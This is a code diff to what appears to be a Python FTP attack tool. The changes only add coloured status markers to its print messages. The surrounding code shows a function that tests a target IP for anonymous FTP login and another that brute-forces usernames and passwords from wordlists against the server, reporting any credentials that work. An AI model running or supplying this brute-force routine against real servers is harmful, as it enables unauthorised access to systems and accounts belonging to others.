@@ -7,11 +7,11 @@ def check_anonymous_login(ip):
     try:
         ftp = ftplib.FTP(ip)
         ftp.login('anonymous', '')
-        print(f"Anonymous login allowed on {ip}.")
+        print(f"[\033[32m+\033[0m] Anonymous login allowed on {ip}.")
         ftp.quit()
         return True
     except ftplib.error_perm as e:
-        print(f"Anonymous login not allowed on {ip}: {e}")
+        print(f"[\033[31m!\033[0m] Anonymous login not allowed on {ip}: {e}")
         return False
 
 def brute_force_ftp(ip, username_file, password_file):
@@ -27,13 +27,13 @@ def brute_force_ftp(ip, username_file, password_file):
                 print(f"Trying {username}:{password}...")
                 ftp = ftplib.FTP(ip)
                 ftp.login(username, password)
-                print(f"Login successful with {username}:{password}")
+                print(f"[\033[32m+\033[0m] Login successful with {username}:{password}")
                 ftp.quit()
                 return True
             except ftplib.error_perm as e:
                 # Login failed, print error message if needed
                 pass
-    print("Brute-force attack finished, no valid credentials found.")
+    print("[\033[31m!\033[0m] Brute-force attack finished, no valid credentials found.")
     return False
 
 def ftp_info(ip):
@@ -53,7 +53,7 @@ def ftp_info(ip):
         # Run brute-force attack if anonymous login fails
         brute_force_ftp(ip, username_file, password_file)
     else:
-        print("FTP service not detected or port 21 is closed.")
+        print("[\033[31m!\033[0m] FTP service not detected or port 21 is closed.")
 
 
 def ftp(target):
